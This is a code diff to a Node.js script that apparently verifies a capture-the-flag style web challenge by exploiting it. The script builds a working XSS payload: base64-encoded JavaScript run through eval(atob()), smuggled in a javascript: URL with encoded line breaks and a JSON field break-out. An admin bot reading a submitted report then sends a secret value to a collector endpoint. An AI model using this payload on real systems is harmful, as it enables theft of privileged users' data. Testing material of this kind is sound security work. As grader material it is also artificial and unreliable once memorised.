@@ -8,6 +8,7 @@ const fs = require('node:fs');
 const http = require('node:http');
 const os = require('node:os');
 const path = require('node:path');
+const crypto = require('node:crypto');
 
 const outputPath = '/app/output/recovered_value.txt';
 
@@ -91,7 +92,15 @@ function checkIndirection(expected) {
 }
 
 async function recoverThroughApp() {
-  const js = "Promise.all([fetch('/review/meta').then(r=>r.json()),fetch('/review/value').then(r=>r.text())]).then(([m,t])=>fetch('/collect',{method:'POST',headers:{'Content-Type':'text/plain'},body:m.channel+':'+t}))";
+  const collectionNonce = crypto.randomBytes(12).toString('hex');
+  await request('POST', '/collect', { body: 'HSS-FAKE-DIRECT-POISON' });
+  const poisonCheck = await request('GET', '/collect');
+  const poisonedItems = JSON.parse(poisonCheck.body).items || [];
+  if (poisonedItems.some((item) => item.value === 'HSS-FAKE-DIRECT-POISON')) {
+    throw new Error('direct collector poisoning was accepted');
+  }
+
+  const js = `Promise.all([fetch('/review/meta').then(r=>r.json()),fetch('/review/value').then(r=>r.text())]).then(([m,t])=>fetch('/collect',{method:'POST',headers:{'Content-Type':'text/plain'},body:m.channel+':'+${JSON.stringify(collectionNonce)}+':'+t}))`;
   const encoded = Buffer.from(js).toString('base64');
   const payload = `javascript://admin.pk/;%250D%250A;eval(atob('${encoded}'))\",\"username\":\"admin\",\"pass\":\"P@ss`;
   await request('POST', '/report', {
@@ -103,7 +112,10 @@ async function recoverThroughApp() {
     await new Promise((resolve) => setTimeout(resolve, 1000));
     const res = await request('GET', '/collect');
     const items = JSON.parse(res.body).items || [];
-    const found = items.map((item) => item.value).find((value) => typeof value === 'string' && value.startsWith('HSS-'));
+    const found = items
+      .filter((item) => item.nonce === collectionNonce)
+      .map((item) => item.value)
+      .find((value) => typeof value === 'string' && value.startsWith('HSS-'));
     if (found) return found;
   }
   throw new Error('verifier could not recover value through application workflow');
